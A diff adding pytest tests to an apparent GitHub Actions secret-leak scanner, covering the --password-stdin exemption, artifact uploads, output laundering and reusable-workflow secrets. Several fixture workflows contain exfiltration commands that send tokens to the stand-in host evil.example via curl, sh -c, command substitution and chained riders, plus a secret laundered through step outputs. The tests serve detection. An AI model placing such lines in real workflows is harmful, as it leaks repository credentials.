@@ -446,3 +446,322 @@ jobs:
 """)
     hits = scan_target(tmp_path, [], [])
     assert [h for h in hits if h.sink_kind == "run_block"] == []
+
+
+# ---------------------------------------------------------------------------
+# --password-stdin pipe pattern — safe sink exemption
+# ---------------------------------------------------------------------------
+
+
+def test_password_stdin_pipe_suppresses_secret_in_run_body(
+    tmp_path: Path,
+) -> None:
+    """``echo "$SECRET" | docker login --password-stdin`` is the
+    recommended safe pattern — the secret never hits the process
+    argv or log. All secret refs piped through --password-stdin
+    should suppress the run_block finding."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          CR_PAT: ${{ secrets.GHCR_TOKEN }}
+        run: echo "$CR_PAT" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert run_hits == [], (
+        "password-stdin pipe pattern should be suppressed"
+    )
+
+
+def test_password_stdin_does_not_suppress_when_other_refs_remain(
+    tmp_path: Path,
+) -> None:
+    """If the body has a --password-stdin line but ALSO uses the
+    secret in a non-piped context, the finding must still fire."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          CR_PAT: ${{ secrets.GHCR_TOKEN }}
+        run: |
+          echo "$CR_PAT" | docker login ghcr.io --password-stdin
+          curl https://evil.example/?t=$CR_PAT
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) >= 1, (
+        "non-piped secret ref must still fire"
+    )
+
+
+# ---------------------------------------------------------------------------
+# GITHUB_TOKEN-only upload-artifact exemption
+# ---------------------------------------------------------------------------
+
+
+def test_upload_artifact_github_token_only_no_finding(
+    tmp_path: Path,
+) -> None:
+    """When the ONLY secret-bound env var is GITHUB_TOKEN (ephemeral,
+    auto-scoped) and it hasn't been written to disk, upload-artifact
+    should not fire — the artifact contents are safe."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - run: echo "build output" > /tmp/out.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: /tmp/out.txt
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert not any(h.sink_kind == "upload_artifact" for h in hits)
+
+
+def test_upload_artifact_real_secret_still_fires(
+    tmp_path: Path,
+) -> None:
+    """When a REAL secret (not just GITHUB_TOKEN) is bound, the
+    upload-artifact finding must still fire."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: env > /tmp/snapshot
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: /tmp/snapshot
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "upload_artifact" for h in hits)
+
+
+# ---------------------------------------------------------------------------
+# Cross-step laundering must not be suppressed by stdin-pipe check
+# ---------------------------------------------------------------------------
+
+
+def test_step_output_taint_not_suppressed_by_stdin_pipe_vacuous_truth(
+    tmp_path: Path,
+) -> None:
+    """Regression: ``_all_refs_stdin_piped`` must return False when no
+    direct-ref lines are found, not True via vacuous truth.  A step
+    that reads tainted ``steps.X.outputs.Y`` in a curl body MUST
+    still fire, even though the function doesn't see those refs."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - id: launder
+        run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_OUTPUT
+      - run: |
+          curl https://evil.example/?t=${{ steps.launder.outputs.TOK }}
+""")
+    hits = scan_target(tmp_path, [], [])
+    egress = [
+        h for h in hits
+        if h.sink_kind == "run_block" and h.step_index == 1
+    ]
+    assert egress and egress[0].severity == "high"
+
+
+# ---------------------------------------------------------------------------
+# Job-level reusable workflows — secrets: inherit / explicit map
+# ---------------------------------------------------------------------------
+
+def test_job_level_secrets_inherit_fires(tmp_path: Path) -> None:
+    """Reusable workflows are invoked at JOB level; ``secrets:
+    inherit`` forwards every repository secret and must produce the
+    documented low-severity informational finding."""
+    _write_wf(tmp_path, "reuse.yml", """\
+name: x
+on: [push]
+jobs:
+  call:
+    uses: other-org/other-repo/.github/workflows/deploy.yml@main
+    secrets: inherit
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert len(hits) == 1
+    assert hits[0].sink_kind == "reusable_workflow_inherit"
+    assert hits[0].secret_names == ("*",)
+    assert hits[0].severity == "low"
+
+
+def test_job_level_explicit_secrets_map_fires(tmp_path: Path) -> None:
+    _write_wf(tmp_path, "reuse.yml", """\
+name: x
+on: [push]
+jobs:
+  call:
+    uses: ./.github/workflows/local.yml
+    secrets:
+      npm-token: ${{ secrets.NPM_TOKEN }}
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert len(hits) == 1
+    assert hits[0].sink_kind == "reusable_workflow_inherit"
+    assert hits[0].secret_names == ("npm-token",)
+
+
+def test_job_level_uses_without_secrets_silent(tmp_path: Path) -> None:
+    _write_wf(tmp_path, "reuse.yml", """\
+name: x
+on: [push]
+jobs:
+  call:
+    uses: other-org/other-repo/.github/workflows/build.yml@v1
+""")
+    assert scan_target(tmp_path, [], []) == []
+
+
+def test_step_level_yml_uses_treated_untrusted(tmp_path: Path) -> None:
+    """Steps can't ``uses:`` a workflow .yml in valid GHA — if one
+    appears anyway, fail closed as an untrusted action."""
+    _write_wf(tmp_path, "weird.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: org/repo/.github/workflows/x.yml@main
+        with:
+          token: ${{ secrets.NPM_TOKEN }}
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert len(hits) == 1
+    assert hits[0].sink_kind == "untrusted_action"
+
+
+def test_password_stdin_exemption_requires_known_consumer(
+    tmp_path: Path,
+) -> None:
+    """``sh -c 'curl -d @- https://evil.example' --password-stdin``
+    exfiltrates (sh -c ignores trailing args as $0) — a trailing
+    ``--password-stdin`` on an arbitrary command must not buy the
+    exemption."""
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | sh -c 'curl -d @- https://evil.example' --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_rejects_command_substitution(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | docker login $(curl https://evil.example) --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_covers_helm_registry_login(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "ok.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.REGISTRY_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | helm registry login registry.example.org -u bot --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert not any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_rejects_command_riders(
+    tmp_path: Path,
+) -> None:
+    """The exemption covers the exact single-command shape only —
+    ``&& <exfil>`` riding the same line must not inherit it."""
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | docker login -u bot --password-stdin && echo "$TOKEN" | curl -d @- https://evil.example
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_exemption_rejects_prefix_riders(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "evil.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: curl -d "$TOKEN" https://evil.example; echo "$TOKEN" | docker login --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_password_stdin_trailing_registry_host_still_exempt(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "ok.yml", """\
+name: x
+on: [push]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.REGISTRY_TOKEN }}
+    steps:
+      - run: echo "$TOKEN" | docker login -u ${{ github.actor }} --password-stdin ghcr.io
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert not any(h.sink_kind == "run_block" for h in hits)
